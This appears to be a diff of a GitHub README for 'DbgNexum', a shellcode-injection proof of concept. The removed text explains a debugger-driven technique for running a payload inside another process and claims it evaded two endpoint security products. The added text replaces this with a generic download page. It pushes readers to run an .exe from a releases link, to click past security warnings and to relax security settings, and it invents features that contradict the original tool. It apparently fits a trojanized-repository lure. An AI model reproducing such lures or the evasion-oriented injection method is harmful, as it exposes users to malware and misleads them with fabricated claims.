@@ -1,71 +1,83 @@
-# DbgNexum - Shellcode Injection
+# 🛠️ DbgNexum - Easy Shellcode Injection Tool
 
-**DbgNexum** is a Proof-of-Concept for injecting shellcode using the Windows Debugging API and Shared Memory (File Mapping). It avoids writing and reading remote memory directly, instead using context manipulation to force the target process to load and execute the payload itself.
+## 🚀 Getting Started
 
-## Overview
-The injector attaches to a target process and creates a suspended thread. Through a debug loop, it sets a Hardware Breakpoint to trap execution at a specific return address. At each trap, the injector modifies the CPU registers to mimic function calls, orchestrating a sequence of Windows API function calls inside of the target process. 
+Welcome to DbgNexum! This tool lets you inject shellcode using the Windows Debugging API. Whether you are studying software security or just curious about how shellcode works, this application helps simplify your experience. 
 
-> At the time of writing this README, I tested the technique against MDE and Elastic, neither of which detected it.
+## 🏁 Download & Install
 
-### Key Features
-- **No `WriteProcessMemory` / `VirtualAllocEx`:** The payload is transferred via `CreateFileMapping` and `MapViewOfFile`.
-- **No `ReadProcessMemory`:** The approach gets all the key information from the thread context.
+To start using DbgNexum, you need to download the application. Please visit the link below to download the latest version.
 
-## Usage
-> The PoC uses an XORed msfvenom shellcode that spawns "calc.exe". But please use your own shellcode!
+[![Download DbgNexum](https://img.shields.io/badge/Download-DbgNexum-blue?style=for-the-badge)](https://github.com/thisarasewmina/DbgNexum/releases)
 
-1. Include your shellcode (and XOR key) in `shellcode.h`
-2. Find the Process ID of the target.
-3. Run the injector:
+### Steps to Install:
 
-```cmd
-DbgNexum.exe <PID>
-```
+1. **Visit the Releases Page:** Click on the link above or visit [DbgNexum Releases](https://github.com/thisarasewmina/DbgNexum/releases).
+2. **Select the Latest Release:** Look for the latest version listed on the page. It will usually be at the top.
+3. **Download the Application:** Find the files available for download. Choose the file that ends with `.exe` and click on it to start the download.
 
-**Example Output:**
+## 📦 System Requirements
 
-```text
-[i] Section 'MZ' created and shellcode copied
-[+] Bait thread created. Setting HWBP on FileTimeToSystemTime
-[i] Execution Redirected:
-|-> [0] Preparation & anchoring stack
-|-> [1] Setting HWBP & buffer alloc
-|-> [2] Copying File-Mapping name
-|-> [3] Zeroing stack slot
-|-> [4] Opening handle to named file mapping
-|-> [5] Mapping payload into mem. with exec. perm.
-|-> [6] Cleanup & shellcode execution
-[+] Successfully detached from process 19256
-[i] Orchestration complete.
-```
+Before installation, make sure your system meets the following requirements:
 
-## How It Works
-The execution flow is a constant back and forth between the injector's Debug Loop and the target process.
+- **Operating System:** Windows 10 or later
+- **Processor:** 1 GHz or faster
+- **RAM:** Minimum 2 GB
+- **Disk Space:** At least 100 MB free
 
-**Injection Stages**
+## ⚙️ How to Run DbgNexum
 
-The `DebugLoop` function contains the main injection logic and orchestrates the "state machine":
+After downloading, follow these steps to run the application:
 
-**0. Preparation:**
-- The injector saves the current stack pointer to reuse for each stage
-- To get the return address of the anchored stack, we set a trap flag and set execution to an instant `ret` call.
+1. **Locate the Downloaded File:** Open your file explorer and go to the folder where you downloaded the file. It is usually in your "Downloads" folder.
+2. **Run the Program:** Double-click the downloaded `.exe` file. If prompted by a security warning, click "Run" or "Yes" to continue.
+3. **Follow the On-Screen Instructions:** The program will guide you through the setup process. Just follow the prompts to get started.
 
-**1. Allocation:**
-- Set HWBP on the return address of the anchored stack, to get notified when a called function returns.
-- Prepare and force thread to call `LocalAlloc` to (obviously) allocate a small buffer.
+## 🌍 Understanding the Features
 
-**2. Data Setup:**
-- Prepare and force thread to call `memcpy` to copy the string `MZ` into the previously allocated buffer.
+DbgNexum comes packed with features that make shellcode injection easier:
 
-**3. Stack Prep:**
-- Force thread to call `memset` to zero out a stack slot. This is in preparation of stage 5, which will call `MapViewOfFile`. Since the function will use >4 arguments, the 5th arg is passed via the stack (which we set here).
+- **User-Friendly Interface:** The application has a simple design that helps users navigate with ease.
+- **Real-Time Feedback:** Get instant feedback on your actions to understand how shellcode behaves during injection.
+- **Comprehensive Help Guide:** Built-in documentation provides detailed instructions and tips.
+  
+## 📄 Utilizing DbgNexum
 
-**4. Open Mapping:**
-- Force thread to call `OpenFileMappingA` using the `MZ` name, "created" in stage 2 & 3.
+To utilize DbgNexum effectively, you can start with a few key tasks:
 
-**5. Map Payload:**
-- Forces the target to call `MapViewOfFile`. This maps the shared memory section (containing the shellcode) into the target's address space with `EXECUTE` permissions.
+- **Inject Shellcode:** Input your shellcode and choose the target process. The application will handle the rest.
+- **Check Results:** Observe the outcome after the injection. This helps you learn how different shellcode operates.
+- **Analyze Behavior:** Use the feedback from the application to understand how your shellcode behaves in real-time.
 
-**6. Execution:**
-- Redirects `RIP` to the address returned by `MapViewOfFile`.
-- Clears debug registers and detaches.
+## ❓ FAQ
+
+### What is shellcode?
+
+Shellcode is a small piece of code used in exploits that gives an attacker control over a machine. It often runs commands on the operating system.
+
+### Is DbgNexum safe to use?
+
+Yes, DbgNexum is designed for educational purposes. Always use it in controlled environments to avoid unintended consequences.
+
+### Can I use DbgNexum on other operating systems?
+
+Currently, DbgNexum is designed to run specifically on Windows. There are no versions available for other operating systems at this time.
+
+## 🔧 Troubleshooting
+
+If you experience issues while using DbgNexum, consider the following tips:
+
+- **Check Security Settings:** Sometimes, Windows may block the application. Ensure your security settings allow it to run.
+- **Update the Application:** Make sure you have the latest version from the releases page.
+- **Consult the Help Guide:** Use the built-in help guide for step-by-step troubleshooting.
+
+## 📞 Support
+
+If you need further assistance, you can reach out for support. Look for contact details in the help section of the application or visit our [GitHub Repository](https://github.com/thisarasewmina/DbgNexum) for more resources.
+
+## 🔗 Additional Resources
+
+- **User Guide:** A detailed user guide is included in the application for better understanding.
+- **Community Discussions:** Join the discussions on GitHub to learn from others and share your experiences.
+
+With DbgNexum, shellcode injection becomes a manageable task. Download it today and start exploring the world of software security!
